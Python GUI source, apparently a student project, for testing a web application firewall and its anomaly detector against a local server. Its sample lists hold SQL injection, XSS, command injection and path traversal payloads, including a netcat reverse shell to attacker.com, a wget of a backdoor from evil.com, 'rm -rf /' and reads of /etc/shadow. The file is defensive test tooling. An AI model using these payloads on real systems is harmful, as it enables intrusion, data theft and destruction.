"""
WAF Management Suite - Unified GUI Tool
Combines: Attack Generator, Anomaly Testing, and User Management
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
import threading
import time
from datetime import datetime
from ultra_anomaly_detection import AnomalyDetector
from database import init_db, create_user as db_create_user, get_all_users
from werkzeug.security import generate_password_hash
import matplotlib
matplotlib.use('TkAgg')
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

class WAFManagementSuite:
    def __init__(self, root):
        self.root = root
        self.root.title("WAF Management Suite")
        self.root.geometry("1000x700")
        self.root.resizable(True, True)
        
        # Configuration
        self.base_url = "http://127.0.0.1:5000"
        self.is_running = False
        
        # Setup UI
        self.setup_ui()
        
    def setup_ui(self):
        # Title
        title_frame = tk.Frame(self.root, bg="#667eea", pady=15)
        title_frame.pack(fill="x")
        
        title = tk.Label(
            title_frame,
            text="🛡️ WAF Management Suite",
            font=("Arial", 24, "bold"),
            fg="white",
            bg="#667eea"
        )
        title.pack()
        
        subtitle = tk.Label(
            title_frame,
            text="Attack Generator • Anomaly Testing • User Management",
            font=("Arial", 11),
            fg="white",
            bg="#667eea"
        )
        subtitle.pack()
        
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Tab 1: Attack Generator
        self.attack_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.attack_tab, text="🔥 Attack Generator")
        self.setup_attack_generator_tab()
        
        # Tab 2: Anomaly Testing
        self.anomaly_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.anomaly_tab, text="🎯 Anomaly Testing")
        self.setup_anomaly_testing_tab()
        
        # Tab 3: User Management
        self.user_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.user_tab, text="👤 User Management")
        self.setup_user_management_tab()
        
    # ==========================================
    # TAB 1: ATTACK GENERATOR
    # ==========================================
    
    def setup_attack_generator_tab(self):
        # Configuration Frame
        config_frame = ttk.LabelFrame(self.attack_tab, text="Attack Configuration", padding=15)
        config_frame.pack(fill="x", padx=20, pady=10)
        
        tk.Label(config_frame, text="Target URL:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.url_entry = tk.Entry(config_frame, width=50, font=("Arial", 10))
        self.url_entry.insert(0, self.base_url)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        
        tk.Label(config_frame, text="Attack Category:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky="nw", padx=5, pady=5)
        
        self.category_var = tk.StringVar(value="all")
        categories = [
            ("All Attack Types", "all"),
            ("SQL Injection", "sql"),
            ("Cross-Site Scripting (XSS)", "xss"),
            ("Command Injection", "cmd"),
            ("Directory Traversal", "traversal"),
            ("File Inclusion", "file")
        ]
        
        category_frame = tk.Frame(config_frame)
        category_frame.grid(row=1, column=1, sticky="w", padx=5)
        
        for text, value in categories:
            rb = tk.Radiobutton(
                category_frame,
                text=text,
                variable=self.category_var,
                value=value,
                font=("Arial", 9)
            )
            rb.pack(anchor="w", pady=2)
        
        # Control Buttons
        button_frame = tk.Frame(self.attack_tab)
        button_frame.pack(pady=15)
        
        self.start_attack_btn = tk.Button(
            button_frame,
            text="🚀 Start Attack Generation",
            command=self.start_attacks,
            bg="#667eea",
            fg="white",
            font=("Arial", 12, "bold"),
            padx=20,
            pady=10,
            cursor="hand2"
        )
        self.start_attack_btn.pack(side="left", padx=5)
        
        self.stop_attack_btn = tk.Button(
            button_frame,
            text="⛔ Stop",
            command=self.stop_attacks,
            bg="#dc3545",
            fg="white",
            font=("Arial", 12, "bold"),
            padx=20,
            pady=10,
            state="disabled",
            cursor="hand2"
        )
        self.stop_attack_btn.pack(side="left", padx=5)
        
        # Progress
        progress_frame = ttk.LabelFrame(self.attack_tab, text="Progress", padding=10)
        progress_frame.pack(fill="x", padx=20, pady=10)
        
        self.attack_progress = ttk.Progressbar(progress_frame, mode='determinate')
        self.attack_progress.pack(fill="x", pady=5)
        
        self.attack_status_label = tk.Label(progress_frame, text="Ready", fg="#28a745", font=("Arial", 10, "bold"))
        self.attack_status_label.pack()
        
        # Statistics
        stats_frame = tk.Frame(self.attack_tab)
        stats_frame.pack(fill="x", padx=20, pady=10)
        
        self.attack_stats_label = tk.Label(
            stats_frame,
            text="Sent: 0 | Blocked: 0 | Success Rate: 0%",
            font=("Arial", 11, "bold"),
            fg="#333"
        )
        self.attack_stats_label.pack()
        
        # Log Output
        log_frame = ttk.LabelFrame(self.attack_tab, text="Attack Log", padding=10)
        log_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        self.attack_log_text = scrolledtext.ScrolledText(
            log_frame,
            wrap=tk.WORD,
            height=15,
            font=("Courier", 9)
        )
        self.attack_log_text.pack(fill="both", expand=True)
    
    def get_attacks(self):
        attacks = {
            'sql': [
                ("/search", {"q": "' UNION SELECT * FROM users--"}),
                ("/product", {"id": "1' OR '1'='1"}),
                ("/filter", {"category": "books' OR 1=1--"}),
                ("/login", {"username": "admin'--", "password": "test"}),
                ("/api/data", {"query": "SELECT * WHERE id='1' UNION"}),
            ],
            'xss': [
                ("/search", {"q": "<script>alert(1)</script>"}),
                ("/comment", {"text": "<img src=x onerror=alert(1)>"}),
                ("/input", {"data": "<svg onload=alert(1)>"}),
                ("/profile", {"bio": "<body onload=alert(1)>"}),
                ("/page", {"content": "<iframe src=javascript:alert(1)>"}),
            ],
            'cmd': [
                ("/exec", {"cmd": "; cat /etc/passwd"}),
                ("/run", {"command": "| ls -la"}),
                ("/ping", {"host": "127.0.0.1; whoami"}),
                ("/system", {"input": "$(uname -a)"}),
                ("/diag", {"tool": "traceroute && cat /etc/hosts"}),
            ],
            'traversal': [
                ("/files", {"path": "../../../../etc/passwd"}),
                ("/download", {"file": "../../windows/system32/config"}),
                ("/include", {"page": "../../../etc/shadow"}),
                ("/view", {"doc": "../../var/log/auth.log"}),
            ],
            'file': [
                ("/include", {"file": "php://filter/resource=/etc/passwd"}),
                ("/load", {"url": "file:///etc/hosts"}),
                ("/page", {"include": "../../../../config.php"}),
            ]
        }
        
        category = self.category_var.get()
        if category == "all":
            result = []
            for attacks_list in attacks.values():
                result.extend(attacks_list)
            return result
        else:
            return attacks.get(category, [])
    
    def send_attack(self, path, params):
        try:
            url = self.url_entry.get() + path
            response = requests.get(url, params=params, timeout=5)
            return response.status_code == 403
        except Exception as e:
            self.log_attack(f"❌ Error: {str(e)}", "red")
            return False
    
    def run_attacks(self):
        self.is_running = True
        attacks = self.get_attacks()
        total = len(attacks)
        sent = 0
        blocked = 0
        
        self.log_attack(f"🔥 Starting attack generation: {total} attacks", "blue")
        self.log_attack(f"🎯 Target: {self.url_entry.get()}", "blue")
        self.log_attack("=" * 70, "gray")
        
        for i, (path, params) in enumerate(attacks):
            if not self.is_running:
                self.log_attack("⛔ Attack generation stopped by user", "orange")
                break
            
            progress = ((i + 1) / total) * 100
            self.attack_progress['value'] = progress
            self.update_attack_status(f"Sending attack {i+1}/{total}...", "#ffc107")
            
            is_blocked = self.send_attack(path, params)
            sent += 1
            
            if is_blocked:
                blocked += 1
                self.log_attack(f"🔴 BLOCKED: {path} - {list(params.values())[0][:50]}", "red")
            else:
                self.log_attack(f"🟢 PASSED: {path} - {list(params.values())[0][:50]}", "green")
            
            self.update_attack_stats(sent, blocked)
            time.sleep(0.3)
        
        self.attack_progress['value'] = 100
        self.update_attack_status("✅ Complete!", "#28a745")
        self.log_attack("=" * 70, "gray")
        self.log_attack(f"✅ Attack generation complete!", "green")
        if sent > 0:
            self.log_attack(f"📊 Results: {blocked}/{sent} attacks blocked ({blocked/sent*100:.1f}%)", "blue")
        
        self.is_running = False
        self.start_attack_btn.config(state="normal")
        self.stop_attack_btn.config(state="disabled")
    
    def start_attacks(self):
        if self.is_running:
            return
        
        if not messagebox.askyesno(
            "Confirm Attack Generation",
            f"Generate {len(self.get_attacks())} test attacks?\n\n"
            f"Target: {self.url_entry.get()}\n"
            f"Category: {self.category_var.get()}"
        ):
            return
        
        self.attack_log_text.delete(1.0, tk.END)
        self.attack_progress['value'] = 0
        self.update_attack_stats(0, 0)
        
        self.start_attack_btn.config(state="disabled")
        self.stop_attack_btn.config(state="normal")
        
        thread = threading.Thread(target=self.run_attacks, daemon=True)
        thread.start()
    
    def stop_attacks(self):
        self.is_running = False
        self.stop_attack_btn.config(state="disabled")
        self.start_attack_btn.config(state="normal")
    
    def log_attack(self, message, color="black"):
        self.attack_log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")
        self.attack_log_text.see(tk.END)
        self.root.update()
    
    def update_attack_status(self, text, color="#28a745"):
        self.attack_status_label.config(text=text, fg=color)
        self.root.update()
    
    def update_attack_stats(self, sent, blocked):
        success_rate = (blocked / sent * 100) if sent > 0 else 0
        self.attack_stats_label.config(
            text=f"Sent: {sent} | Blocked: {blocked} | Block Rate: {success_rate:.1f}%"
        )
    
    # ==========================================
    # TAB 2: ANOMALY TESTING
    # ==========================================
    
    def setup_anomaly_testing_tab(self):
        # Info Frame
        info_frame = ttk.LabelFrame(self.anomaly_tab, text="About Anomaly Testing", padding=15)
        info_frame.pack(fill="x", padx=20, pady=10)
        
        info_text = (
            "This tool tests the anomaly detection accuracy using:\n"
            "• 50 normal traffic samples (70% for training, 30% for testing)\n"
            "• 50 malicious traffic samples\n"
            "• Calculates Accuracy, Precision, Recall, F1-Score\n"
            "• Target: ≥80% accuracy for Objective 3"
        )
        tk.Label(info_frame, text=info_text, justify="left", font=("Arial", 10)).pack(anchor="w")
        
        # Configuration
        config_frame = ttk.LabelFrame(self.anomaly_tab, text="Test Configuration", padding=15)
        config_frame.pack(fill="x", padx=20, pady=10)
        
        tk.Label(config_frame, text="Detection Threshold:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.threshold_var = tk.IntVar(value=75)
        self.threshold_scale = tk.Scale(
            config_frame,
            from_=0,
            to=100,
            orient=tk.HORIZONTAL,
            variable=self.threshold_var,
            length=300
        )
        self.threshold_scale.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(config_frame, textvariable=self.threshold_var, font=("Arial", 10)).grid(row=0, column=2, padx=5)
        
        # Control Button
        button_frame = tk.Frame(self.anomaly_tab)
        button_frame.pack(pady=15)
        
        self.run_test_btn = tk.Button(
            button_frame,
            text="🎯 Run Anomaly Detection Test",
            command=self.run_anomaly_test,
            bg="#667eea",
            fg="white",
            font=("Arial", 12, "bold"),
            padx=30,
            pady=10,
            cursor="hand2"
        )
        self.run_test_btn.pack()
        
        # Results Display - Split into text and visualization
        results_container = tk.Frame(self.anomaly_tab)
        results_container.pack(fill="both", expand=True, padx=20, pady=10)

        # Left side - Text results
        text_frame = ttk.LabelFrame(results_container, text="Test Results", padding=10)
        text_frame.pack(side="left", fill="both", expand=True, padx=(0, 5))

        self.anomaly_results_text = scrolledtext.ScrolledText(
            text_frame,
            wrap=tk.WORD,
            height=25,
            font=("Courier", 9)
        )
        self.anomaly_results_text.pack(fill="both", expand=True)

        # Right side - Visualization
        viz_frame = ttk.LabelFrame(results_container, text="Visualization", padding=10)
        viz_frame.pack(side="right", fill="both", expand=True, padx=(5, 0))

        self.viz_canvas_frame = tk.Frame(viz_frame)
        self.viz_canvas_frame.pack(fill="both", expand=True)
    
    def get_normal_samples(self):
        """Get normal traffic samples"""
        return [
            {'ip': '192.168.1.10', 'path': '/login', 'payload': 'username=john&password=pass123', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/login', 'payload': 'username=alice&password=secret456', 'timestamp': time.time()},
            {'ip': '192.168.1.12', 'path': '/login', 'payload': 'username=bob&password=mypass789', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 5},
            {'ip': '192.168.1.12', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 10},
            {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 15},
            {'ip': '192.168.1.13', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 20},
            {'ip': '192.168.1.10', 'path': '/monitor', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/monitor', 'payload': '', 'timestamp': time.time() + 7},
            {'ip': '192.168.1.10', 'path': '/profile', 'payload': 'name=John Doe&email=john@example.com', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/profile', 'payload': 'name=Alice Smith&bio=Developer', 'timestamp': time.time()},
            {'ip': '192.168.1.12', 'path': '/profile', 'payload': 'name=Bob Jones&phone=1234567890', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/search', 'payload': 'query=cybersecurity', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/search', 'payload': 'query=web application', 'timestamp': time.time()},
            {'ip': '192.168.1.12', 'path': '/search', 'payload': 'query=firewall tutorial', 'timestamp': time.time()},
            {'ip': '192.168.1.13', 'path': '/search', 'payload': 'query=python programming', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/api/logs', 'payload': 'limit=50&offset=0', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/api/logs', 'payload': 'limit=100', 'timestamp': time.time()},
            {'ip': '192.168.1.12', 'path': '/api/logs', 'payload': 'type=SQL Injection', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/contact', 'payload': 'name=User&message=Hello world', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/feedback', 'payload': 'rating=5&comment=Great app', 'timestamp': time.time()},
            {'ip': '192.168.1.12', 'path': '/support', 'payload': 'issue=Login problem', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/', 'payload': '', 'timestamp': time.time() + 2},
            {'ip': '192.168.1.12', 'path': '/', 'payload': '', 'timestamp': time.time() + 4},
            {'ip': '192.168.1.10', 'path': '/logout', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/logout', 'payload': '', 'timestamp': time.time() + 3},
            {'ip': '192.168.1.10', 'path': '/settings', 'payload': 'theme=dark&language=en', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/settings', 'payload': 'notifications=true', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/download/report.pdf', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/download/data.csv', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/change-password', 'payload': 'old=pass123&new=newpass456', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/verify', 'payload': 'token=abc123def456', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/upload', 'payload': 'file=avatar.jpg&size=50KB', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/calendar', 'payload': 'date=2025-11-07', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/help', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/help/faq', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/about', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/terms', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/privacy', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/blog/security', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/blog/waf-guide', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/comment', 'payload': 'post_id=123&text=Great', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/comment', 'payload': 'post_id=124&text=Helpful', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/cart', 'payload': 'action=add&item_id=456', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/cart', 'payload': 'action=remove&item_id=457', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/checkout', 'payload': 'total=99.99&method=credit', 'timestamp': time.time()},
            {'ip': '192.168.1.10', 'path': '/orders', 'payload': '', 'timestamp': time.time()},
            {'ip': '192.168.1.11', 'path': '/invoice/123', 'payload': '', 'timestamp': time.time()},
        ]
    
    def get_malicious_samples(self):
        """Get malicious traffic samples"""
        return [
            # SQL Injection (15)
            {'ip': '10.0.0.5', 'path': '/search', 'payload': "query=' OR '1'='1' --", 'timestamp': time.time()},
            {'ip': '10.0.0.5', 'path': '/search', 'payload': "query=1' UNION SELECT username,password FROM users--", 'timestamp': time.time()},
            {'ip': '10.0.0.5', 'path': '/login', 'payload': "username=admin'--&password=anything", 'timestamp': time.time()},
            {'ip': '10.0.0.6', 'path': '/product', 'payload': "id=1' AND 1=1--", 'timestamp': time.time()},
            {'ip': '10.0.0.6', 'path': '/user', 'payload': "id=1' OR '1'='1", 'timestamp': time.time()},
            {'ip': '10.0.0.7', 'path': '/search', 'payload': "query='; DROP TABLE users--", 'timestamp': time.time()},
            {'ip': '10.0.0.7', 'path': '/api', 'payload': "param=1' UNION ALL SELECT database(),user()--", 'timestamp': time.time()},
            {'ip': '10.0.0.8', 'path': '/filter', 'payload': "category=books' OR 1=1 LIMIT 1--", 'timestamp': time.time()},
            {'ip': '10.0.0.8', 'path': '/report', 'payload': "id=1'; EXEC xp_cmdshell('dir')--", 'timestamp': time.time()},
            {'ip': '10.0.0.9', 'path': '/search', 'payload': "q=test' AND SLEEP(5)--", 'timestamp': time.time()},
            {'ip': '10.0.0.9', 'path': '/data', 'payload': "filter=1' AND BENCHMARK(5000000,MD5('A'))--", 'timestamp': time.time()},
            {'ip': '10.0.0.10', 'path': '/view', 'payload': "id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", 'timestamp': time.time()},
            {'ip': '10.0.0.10', 'path': '/page', 'payload': "id=1' UNION SELECT NULL,NULL,NULL--", 'timestamp': time.time()},
            {'ip': '10.0.0.11', 'path': '/search', 'payload': "q=admin' AND extractvalue(1,concat(0x7e,database()))--", 'timestamp': time.time()},
            {'ip': '10.0.0.11', 'path': '/login', 'payload': "user=' OR '1'='1'/*&pass=anything", 'timestamp': time.time()},
            
            # XSS (15)
            {'ip': '10.0.0.12', 'path': '/search', 'payload': 'query=<script>alert(1)</script>', 'timestamp': time.time()},
            {'ip': '10.0.0.12', 'path': '/comment', 'payload': 'text=<img src=x onerror=alert(document.cookie)>', 'timestamp': time.time()},
            {'ip': '10.0.0.13', 'path': '/profile', 'payload': 'bio=<svg onload=alert(1)>', 'timestamp': time.time()},
            {'ip': '10.0.0.13', 'path': '/input', 'payload': 'data=<body onload=alert(1)>', 'timestamp': time.time()},
            {'ip': '10.0.0.14', 'path': '/page', 'payload': 'content=<iframe src=javascript:alert(1)>', 'timestamp': time.time()},
            {'ip': '10.0.0.14', 'path': '/post', 'payload': 'title=<script>document.location="http://evil.com"</script>', 'timestamp': time.time()},
            {'ip': '10.0.0.15', 'path': '/submit', 'payload': 'text=<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', 'timestamp': time.time()},
            {'ip': '10.0.0.15', 'path': '/form', 'payload': 'input="><script>alert(String.fromCharCode(88,83,83))</script>', 'timestamp': time.time()},
            {'ip': '10.0.0.16', 'path': '/msg', 'payload': 'message=<svg><script>alert(1)</script></svg>', 'timestamp': time.time()},
            {'ip': '10.0.0.16', 'path': '/edit', 'payload': 'content=<object data="javascript:alert(1)">', 'timestamp': time.time()},
            {'ip': '10.0.0.17', 'path': '/upload', 'payload': 'file=<embed src="javascript:alert(1)">', 'timestamp': time.time()},
            {'ip': '10.0.0.17', 'path': '/create', 'payload': 'html=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', 'timestamp': time.time()},
            {'ip': '10.0.0.18', 'path': '/update', 'payload': 'style=<style>*{background:url("javascript:alert(1)")}</style>', 'timestamp': time.time()},
            {'ip': '10.0.0.18', 'path': '/render', 'payload': 'template=<link rel="stylesheet" href="javascript:alert(1)">', 'timestamp': time.time()},
            {'ip': '10.0.0.19', 'path': '/parse', 'payload': 'xml=<xml><script>alert(1)</script></xml>', 'timestamp': time.time()},
            
            # Command Injection (10)
            {'ip': '10.0.0.20', 'path': '/exec', 'payload': 'cmd=; cat /etc/passwd', 'timestamp': time.time()},
            {'ip': '10.0.0.20', 'path': '/run', 'payload': 'command=| ls -la', 'timestamp': time.time()},
            {'ip': '10.0.0.21', 'path': '/api/exec', 'payload': 'input=`whoami`', 'timestamp': time.time()},
            {'ip': '10.0.0.21', 'path': '/system', 'payload': 'cmd=$(id)', 'timestamp': time.time()},
            {'ip': '10.0.0.22', 'path': '/ping', 'payload': 'host=127.0.0.1; nc -e /bin/bash attacker.com 4444', 'timestamp': time.time()},
            {'ip': '10.0.0.22', 'path': '/diag', 'payload': 'tool=traceroute && wget http://evil.com/backdoor.sh', 'timestamp': time.time()},
            {'ip': '10.0.0.23', 'path': '/cmd', 'payload': 'exec=127.0.0.1 | bash -i', 'timestamp': time.time()},
            {'ip': '10.0.0.23', 'path': '/shell', 'payload': 'input=; rm -rf /', 'timestamp': time.time()},
            {'ip': '10.0.0.24', 'path': '/execute', 'payload': 'cmd=python -c "import os; os.system(\\"ls\\")"', 'timestamp': time.time()},
            {'ip': '10.0.0.24', 'path': '/run', 'payload': 'command=perl -e "exec \\"/bin/bash\\""', 'timestamp': time.time()},
            
            # Directory Traversal (10)
            {'ip': '10.0.0.25', 'path': '/files', 'payload': 'path=../../../../etc/passwd', 'timestamp': time.time()},
            {'ip': '10.0.0.25', 'path': '/download', 'payload': 'file=..\\..\\..\\windows\\system32\\config\\sam', 'timestamp': time.time()},
            {'ip': '10.0.0.26', 'path': '/include', 'payload': 'page=php://filter/resource=/etc/passwd', 'timestamp': time.time()},
            {'ip': '10.0.0.26', 'path': '/read', 'payload': 'file=....//....//....//etc/shadow', 'timestamp': time.time()},
            {'ip': '10.0.0.27', 'path': '/view', 'payload': 'doc=../../../../../../proc/self/environ', 'timestamp': time.time()},
            {'ip': '10.0.0.27', 'path': '/show', 'payload': 'file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'timestamp': time.time()},
            {'ip': '10.0.0.28', 'path': '/get', 'payload': 'path=..%252f..%252f..%252fetc%252fpasswd', 'timestamp': time.time()},
            {'ip': '10.0.0.28', 'path': '/load', 'payload': 'file=c:\\windows\\win.ini', 'timestamp': time.time()},
            {'ip': '10.0.0.29', 'path': '/open', 'payload': 'doc=/var/www/../../etc/passwd', 'timestamp': time.time()},
            {'ip': '10.0.0.29', 'path': '/fetch', 'payload': 'resource=file:///etc/passwd', 'timestamp': time.time()},
        ]
    
    def create_visualizations(self, tp, fp, tn, fn, accuracy, precision, recall, f1_score, specificity):
        '''Create and display visualizations for anomaly test results'''
        # Clear previous canvas
        for widget in self.viz_canvas_frame.winfo_children():
            widget.destroy()

        # Create figure with subplots
        fig = Figure(figsize=(6, 8), dpi=100)

        # Subplot 1: Confusion Matrix Bar Chart
        ax1 = fig.add_subplot(3, 1, 1)
        categories = ['True\nPositives', 'False\nPositives', 'True\nNegatives', 'False\nNegatives']
        values = [tp, fp, tn, fn]
        colors = ['#28a745', '#dc3545', '#28a745', '#dc3545']
        bars = ax1.bar(categories, values, color=colors, alpha=0.7, edgecolor='black')
        ax1.set_ylabel('Count', fontsize=10, fontweight='bold')
        ax1.set_title('Confusion Matrix', fontsize=11, fontweight='bold')
        ax1.grid(axis='y', alpha=0.3)

        # Add value labels on bars
        for bar in bars:
            height = bar.get_height()
            ax1.text(bar.get_x() + bar.get_width()/2., height,
                    f'{int(height)}',
                    ha='center', va='bottom', fontsize=9, fontweight='bold')

        # Subplot 2: Performance Metrics Bar Chart
        ax2 = fig.add_subplot(3, 1, 2)
        metrics = ['Accuracy', 'Precision', 'Recall', 'F1-Score', 'Specificity']
        metric_values = [accuracy, precision, recall, f1_score, specificity]

        # Color based on value (green if >= 80%, orange if >= 60%, red otherwise)
        metric_colors = []
        for val in metric_values:
            if val >= 80:
                metric_colors.append('#28a745')
            elif val >= 60:
                metric_colors.append('#ffc107')
            else:
                metric_colors.append('#dc3545')

        bars2 = ax2.barh(metrics, metric_values, color=metric_colors, alpha=0.7, edgecolor='black')
        ax2.set_xlabel('Percentage (%)', fontsize=10, fontweight='bold')
        ax2.set_title('Performance Metrics', fontsize=11, fontweight='bold')
        ax2.set_xlim(0, 100)
        ax2.grid(axis='x', alpha=0.3)
        ax2.axvline(x=80, color='red', linestyle='--', linewidth=1, label='Target (80%)')
        ax2.legend(fontsize=8)

        # Add value labels on bars
        for bar, val in zip(bars2, metric_values):
            width = bar.get_width()
            ax2.text(width + 2, bar.get_y() + bar.get_height()/2.,
                    f'{val:.1f}%',
                    ha='left', va='center', fontsize=9, fontweight='bold')

        # Subplot 3: Results Distribution Pie Chart
        ax3 = fig.add_subplot(3, 1, 3)
        total = tp + fp + tn + fn
        labels = ['True Positives\n(Correct Detections)',
                 'False Positives\n(False Alarms)',
                 'True Negatives\n(Correct Passes)',
                 'False Negatives\n(Missed Attacks)']
        sizes = [tp, fp, tn, fn]
        colors_pie = ['#28a745', '#ffc107', '#17a2b8', '#dc3545']
        explode = (0.05, 0.05, 0.05, 0.05)

        ax3.pie(sizes, explode=explode, labels=labels, colors=colors_pie,
               autopct=lambda pct: f'{int(pct*total/100)}\n({pct:.1f}%)',
               shadow=True, startangle=90, textprops={'fontsize': 8})
        ax3.set_title('Results Distribution', fontsize=11, fontweight='bold')

        fig.tight_layout(pad=2.0)

        # Embed in tkinter
        canvas = FigureCanvasTkAgg(fig, master=self.viz_canvas_frame)
        canvas.draw()
        canvas.get_tk_widget().pack(fill="both", expand=True)

    def run_anomaly_test(self):
        def test_thread():
            self.run_test_btn.config(state="disabled")
            self.anomaly_results_text.delete(1.0, tk.END)

            def log(msg):
                self.anomaly_results_text.insert(tk.END, msg + "\n")
                self.anomaly_results_text.see(tk.END)
                self.root.update()

            log("="*70)
            log("ANOMALY DETECTION ACCURACY TEST")
            log("="*70)
            log("")

            # Create detector
            detector = AnomalyDetector()

            # Get samples
            normal_samples = self.get_normal_samples()
            malicious_samples = self.get_malicious_samples()

            # Train on first 30 normal samples
            log("Training detector on normal traffic baseline...")
            detector.train_baseline(normal_samples[:30])
            log("")

            # Test variables
            true_positives = 0
            false_positives = 0
            true_negatives = 0
            false_negatives = 0

            threshold = self.threshold_var.get()

            # Test normal traffic
            log("="*70)
            log(f"TESTING NORMAL TRAFFIC (20 test samples, threshold={threshold})")
            log("="*70)

            for i, sample in enumerate(normal_samples[30:], 1):
                is_anom, score, details = detector.is_anomalous(sample, threshold=threshold)
                if is_anom:
                    false_positives += 1
                    log(f"❌ FP #{i}: {sample['path']} (Score: {score:.0f})")
                else:
                    true_negatives += 1
                    log(f"✅ TN #{i}: {sample['path']} (Score: {score:.0f})")

            log("")
            log("="*70)
            log("TESTING MALICIOUS TRAFFIC (50 attack samples)")
            log("="*70)

            for i, sample in enumerate(malicious_samples, 1):
                is_anom, score, details = detector.is_anomalous(sample, threshold=threshold)
                if is_anom:
                    true_positives += 1
                    log(f"✅ TP #{i}: {sample['path']} (Score: {score:.0f})")
                else:
                    false_negatives += 1
                    log(f"❌ FN #{i}: {sample['path']} (Score: {score:.0f})")

            # Calculate metrics
            total = true_positives + false_positives + true_negatives + false_negatives
            accuracy = (true_positives + true_negatives) / total * 100 if total > 0 else 0
            precision = true_positives / (true_positives + false_positives) * 100 if (true_positives + false_positives) > 0 else 0
            recall = true_positives / (true_positives + false_negatives) * 100 if (true_positives + false_negatives) > 0 else 0
            f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
            specificity = true_negatives / (true_negatives + false_positives) * 100 if (true_negatives + false_positives) > 0 else 0

            # Display results
            log("")
            log("="*70)
            log("CONFUSION MATRIX")
            log("="*70)
            log(f"                    Predicted Positive  |  Predicted Negative")
            log(f"Actual Positive     TP: {true_positives:3d}             |  FN: {false_negatives:3d}")
            log(f"Actual Negative     FP: {false_positives:3d}             |  TN: {true_negatives:3d}")

            log("")
            log("="*70)
            log("PERFORMANCE METRICS")
            log("="*70)
            log(f"Total Test Cases:    {total}")
            log(f"True Positives:      {true_positives:3d}  (Attacks correctly detected)")
            log(f"False Positives:     {false_positives:3d}  (Normal traffic wrongly blocked)")
            log(f"True Negatives:      {true_negatives:3d}  (Normal traffic correctly allowed)")
            log(f"False Negatives:     {false_negatives:3d}  (Attacks missed)")
            log("-"*70)
            log(f"Accuracy:            {accuracy:.2f}%  ✓ Target: ≥80%")
            log(f"Precision:           {precision:.2f}%  (When we block, how often correct?)")
            log(f"Recall (Sensitivity):{recall:.2f}%  (What % of attacks we catch?)")
            log(f"Specificity:         {specificity:.2f}%  (What % of normal traffic we allow?)")
            log(f"F1-Score:            {f1_score:.2f}%  (Balance of precision & recall)")
            log("="*70)

            log("")
            log("="*70)
            if accuracy >= 80:
                log("✅ OBJECTIVE 3 SUCCESSFULLY MET!")
                log(f"   Anomaly detection achieved {accuracy:.2f}% accuracy (≥80% required)")
            else:
                log("⚠️  OBJECTIVE 3 NOT MET")
                log(f"   Anomaly detection achieved {accuracy:.2f}% accuracy (need ≥80%)")
                log("")
                log("   RECOMMENDATIONS:")
                log(f"   1. Adjust anomaly threshold (currently {threshold})")
                log("   2. Add more training samples")
                log("   3. Fine-tune baseline parameters")
            log("="*70)

            # Create visualizations
            self.create_visualizations(true_positives, false_positives, true_negatives, false_negatives,
                                     accuracy, precision, recall, f1_score, specificity)

